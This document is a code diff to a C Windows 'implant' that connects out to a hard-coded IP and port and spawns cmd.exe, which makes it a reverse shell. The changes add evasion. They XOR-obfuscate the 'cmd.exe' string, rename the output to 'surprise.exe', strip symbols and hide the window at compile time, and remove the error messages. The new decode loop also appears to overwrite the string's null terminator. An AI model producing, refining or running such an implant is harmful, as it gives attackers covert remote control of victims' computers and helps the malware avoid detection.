@@ -1,11 +1,12 @@
 #include "implant.h"
-// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32
-// futiv command : x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32 -mwindows
+// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32
+// futiv command : x86_64-w64-mingw32-gcc implant.c -o surprise.exe -lws2_32 -mwindows -s
 int main(){
 // Set variables
     char rcvbuffer[DEFAULT_BUFLEN];
     char sndbuffer[DEFAULT_BUFLEN];
-    char command[] = "cmd.exe";
+    char command[] = { 0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00 };
+    decode(command, 'K', 8);
     WSADATA wsa;
     WSAStartup(MAKEWORD(2,2), &wsa);
     SOCKET soc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
@@ -33,28 +34,13 @@ int main(){
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("10.92.230.240");
 
-    // Check the connexion
-    if (connect(soc, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
-        printf("[!] connexion error\n");
-        return 1;
-    }
-    printf("[+] connected !\n");
+    connect(soc, (struct sockaddr *)&server, sizeof(server));
 
-    
-    if (!CreateProcessA(
+    CreateProcessA(
         NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo
-    )) {
-        // print error
-        printf("[!] error CreateProcess: %lu\n", GetLastError());
-        return 1;
-    }
-    printf("[+] CMD.exe successfully ran. waiting...\n");
-
-
+    );
     WaitForSingleObject(pinfo.hProcess, INFINITE);
-    // cleanup
-    closesocket(soc);
-    WSACleanup();
+
     
 
 
@@ -76,4 +62,12 @@ int main(){
     WSACleanup();
 
     return 0;
+}
+
+
+char* decode(char* message, char key, int lenght){
+    for (int i = 0; i < lenght; i++){
+        message[i] = message[i] ^ key;
+    }
+    return message;
 }
